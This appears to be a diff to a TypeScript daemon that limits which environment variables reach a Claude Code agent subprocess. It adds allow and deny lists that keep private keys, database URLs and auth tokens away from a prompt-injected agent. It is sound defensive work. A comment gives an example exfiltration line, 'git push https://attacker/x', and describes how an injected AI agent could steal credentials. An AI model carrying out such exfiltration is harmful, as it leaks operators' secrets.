@@ -32,22 +32,103 @@ function isResultMessage(msg: unknown): msg is SDKResultMessage {
  * GitHub App installation. MCP servers receive the same token via their own
  * env mapping in `src/mcp/registry.ts`.
  */
+// Capability minimization for the agent subprocess (issue #102). Default
+// behavior used to be `...process.env` spread, which forwarded every secret
+// the daemon process holds (App private key, DB URL, daemon auth token, …)
+// to the Claude Code CLI subprocess, where a successful prompt injection
+// could exfiltrate them. This allowlist + denylist replaces the spread:
+// only enumerated keys (or keys matching an allowlisted prefix) reach the
+// subprocess; explicit deny-keys/prefixes are stripped even when they would
+// otherwise match a prefix.
+const ENV_ALLOW_KEYS = new Set<string>([
+  // Process basics
+  "HOME",
+  "PATH",
+  "USER",
+  "LANG",
+  "LC_ALL",
+  "TZ",
+  "TMPDIR",
+  // Node/Bun runtime
+  "NODE_OPTIONS",
+  "NODE_PATH",
+  "NODE_NO_WARNINGS",
+  "NODE_EXTRA_CA_CERTS",
+  // Custom CA bundles
+  "SSL_CERT_FILE",
+  "SSL_CERT_DIR",
+  // Outbound HTTP proxy (uppercase + lowercase variants honored by curl/Node)
+  "HTTP_PROXY",
+  "HTTPS_PROXY",
+  "NO_PROXY",
+  "http_proxy",
+  "https_proxy",
+  "no_proxy",
+  // Locale / TTY hints
+  "NO_COLOR",
+  "FORCE_COLOR",
+  "TERM",
+  "COLORTERM",
+  "CI",
+  // GitHub auth surface for `gh`/`git` inside the agent — the actual values
+  // are typically injected from `installationToken` below; pass-through here
+  // matters only for local dev where the operator pre-sets one.
+  "GH_TOKEN",
+  "GITHUB_TOKEN",
+]);
+
+// Prefix allowlist — forward-compatible coverage for env knobs that vendors
+// keep adding (Claude Code CLI flags, Anthropic SDK config, AWS chain extras,
+// git config). Sensitive overlaps (GITHUB_APP_*, GITHUB_WEBHOOK_*) are
+// stripped by the deny-prefix list below.
+const ENV_ALLOW_PREFIXES = ["CLAUDE_CODE_", "ANTHROPIC_", "AWS_", "GIT_", "GH_"];
+
+const ENV_DENY_KEYS = new Set<string>([
+  "GITHUB_APP_ID",
+  "GITHUB_APP_PRIVATE_KEY",
+  "GITHUB_WEBHOOK_SECRET",
+  "GITHUB_PERSONAL_ACCESS_TOKEN",
+  "DAEMON_AUTH_TOKEN",
+  "DAEMON_AUTH_TOKEN_PREVIOUS",
+  "DATABASE_URL",
+  "VALKEY_URL",
+  "REDIS_URL",
+  "CONTEXT7_API_KEY",
+]);
+
+const ENV_DENY_PREFIXES = ["GITHUB_APP_", "GITHUB_WEBHOOK_"];
+
+function isEnvKeyAllowed(key: string): boolean {
+  if (ENV_DENY_KEYS.has(key)) return false;
+  for (const prefix of ENV_DENY_PREFIXES) {
+    if (key.startsWith(prefix)) return false;
+  }
+  if (ENV_ALLOW_KEYS.has(key)) return true;
+  for (const prefix of ENV_ALLOW_PREFIXES) {
+    if (key.startsWith(prefix)) return true;
+  }
+  return false;
+}
+
 export function buildProviderEnv(
   installationToken?: string,
   artifactsDir?: string,
 ): Record<string, string | undefined> {
-  // Strip empty credential env vars before forwarding to the CLI. The CLI's
-  // documented auth precedence chain (ANTHROPIC_API_KEY at position 3 beats
-  // CLAUDE_CODE_OAUTH_TOKEN at position 5) treats an empty string as a
-  // present-but-blank credential and selects it, blocking the real token
-  // from being used. Common cause: `envFrom: secretRef` over a Secret that
-  // carries a stale empty key.
+  // Strip empty values too — the CLI's auth precedence chain (ANTHROPIC_API_KEY
+  // at position 3 beats CLAUDE_CODE_OAUTH_TOKEN at position 5) treats an empty
+  // string as a present-but-blank credential and selects it, blocking the real
+  // token. Generic blank-stripping protects every credential, not just those
+  // two. Common cause: `envFrom: secretRef` over a Secret with a stale empty
+  // key.
   const isBlank = (v: string | undefined): boolean => typeof v === "string" && v.trim() === "";
-  const { ANTHROPIC_API_KEY, CLAUDE_CODE_OAUTH_TOKEN, ...rest } = process.env;
-  const baseEnv: Record<string, string | undefined> = { ...rest };
-  if (!isBlank(ANTHROPIC_API_KEY)) baseEnv["ANTHROPIC_API_KEY"] = ANTHROPIC_API_KEY;
-  if (!isBlank(CLAUDE_CODE_OAUTH_TOKEN))
-    baseEnv["CLAUDE_CODE_OAUTH_TOKEN"] = CLAUDE_CODE_OAUTH_TOKEN;
+  const baseEnv: Record<string, string | undefined> = Object.fromEntries(
+    Object.entries(process.env).filter(([key, value]) => isEnvKeyAllowed(key) && !isBlank(value)),
+  );
+  // Defense-in-depth: scrub credentials from grandchild subprocesses spawned
+  // by the agent's Bash tool — protects against `git push https://attacker/x`
+  // type exfiltration vectors via env inheritance through the second hop.
+  // See Anthropic Claude Code env-var docs (CLAUDE_CODE_SUBPROCESS_ENV_SCRUB).
+  baseEnv["CLAUDE_CODE_SUBPROCESS_ENV_SCRUB"] = "1";
   const tokenEnv: Record<string, string> =
     installationToken !== undefined && installationToken !== ""
       ? { GH_TOKEN: installationToken, GITHUB_TOKEN: installationToken }
